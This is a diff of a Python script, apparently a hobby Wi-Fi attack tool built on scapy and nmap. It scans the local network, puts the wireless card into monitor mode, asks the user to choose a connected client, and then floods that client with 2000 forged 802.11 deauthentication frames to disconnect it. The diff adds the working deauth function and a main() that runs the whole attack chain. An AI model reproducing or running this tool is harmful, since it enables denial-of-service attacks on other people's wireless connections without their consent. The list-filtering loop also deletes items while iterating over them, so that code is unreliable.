@@ -3,8 +3,10 @@ from scapy.all import *
 import StringIO
 import subprocess
 
+
 def get_network_id():
     routing_table = StringIO.StringIO(conf.route)
+    print conf.route
     for line in routing_table:
         split_line = line.split()
         if split_line[0] == '0.0.0.0':
@@ -59,9 +61,11 @@ def get_ap_mac_from_raw(raw_results, ap_ip):
             return ap_mac
 
 def get_refined_results(raw_results, ap_ip, local_ip):
-    for i in range(0, len(raw_results)):
-        if raw_results[i][1] == ap_ip:
-            del raw_results[i]
+    count = 0
+    for i in raw_results:
+        if i[1] == ap_ip:
+            del raw_results[count]
+        count +=1
     count = 0
     for i in raw_results:
         if i[1] == local_ip:
@@ -76,47 +80,60 @@ def enable_monitor_mode(iface):
     subprocess.call('iwconfig ' + iface + ' mode Monitor', shell=True)
     subprocess.call('ifconfig ' + iface + ' up', shell=True)
 
+def get_bssid():
+    pipe = subprocess.Popen('iwconfig', stdout = subprocess.PIPE)
+    for line in pipe.stdout:
+        if 'Mode:' in line:
+            split_line = line.split()
+            bssid = split_line[-1]
+    pipe.stdout.close()
+    return bssid
+
+def deauthenticate_client(user_choice, refined_results, bssid):
+
+    client_to_deauth = refined_results[user_choice][2]
+
+    client_to_deauth = client_to_deauth.encode('ascii', 'ignore')
+
+    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client_to_deauth,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
+    for n in range(2000):
+        sendp(packet)
 
 
-print(conf.route)
-network_id = get_network_id()
-nm = nmap.PortScanner()
-nm_scan = nm.scan(hosts = network_id, arguments='-sP')
 
 
 
-raw_results = get_raw_results(nm_scan)
-
-ap_ip, local_ip, iface = get_ap_ip_local_ip_iface()
-
-ap_mac = get_ap_mac_from_raw(raw_results, ap_ip)
-
-refined_results = get_refined_results(raw_results, ap_ip, local_ip)
-
-enable_monitor_mode(iface)
-
-print_results(refined_results)
-
-user_choice = ask_user()
-
-# print(nm_scan['scan']['192.168.254.2']['hostname'])
-# mac_addresses = get_mac_addresses(nm_scan)
-
-# packet = RadioTap()/Dot11(type=0,subtype=12,addr1='XX:XX:XX:XX:XX:XX',addr2='XX:XX:XX:XX:XX:XX',addr3='XX:XX:XX:XX:XX:XX')/Dot11Deauth(reason=7)
-# for n in range(1000):
-#     sendp(packet)
-#
-# print conf.iface
-
-# print(a['scan'][u'192.168.254.254']['addresses'][u'mac'])
-# print('')
 
 
-# for k,v in a['scan'].iteritems():
-#     if str(v['status']['state']) == 'up':
-#         number_thread += 1
-#         print str(v)
-#         try:
-#             print str(v['addresses']['ipv4']) + ' => ' + str(v['addresses']['mac'])
-#         except:
-#             print str(v['addresses']['ipv4'])
+
+def main():
+
+    network_id = get_network_id()
+    nm = nmap.PortScanner()
+    nm_scan = nm.scan(hosts = network_id, arguments='-sP')
+
+
+    bssid = get_bssid()
+
+    raw_results = get_raw_results(nm_scan)
+
+    ap_ip, local_ip, iface = get_ap_ip_local_ip_iface()
+
+    ap_mac = get_ap_mac_from_raw(raw_results, ap_ip)
+
+    refined_results = get_refined_results(raw_results, ap_ip, local_ip)
+
+    enable_monitor_mode(iface)
+
+
+
+
+    print_results(refined_results)
+
+    user_choice = ask_user()
+
+
+    deauthenticate_client(user_choice, refined_results, bssid)
+
+if __name__ == "__main__":
+    main()
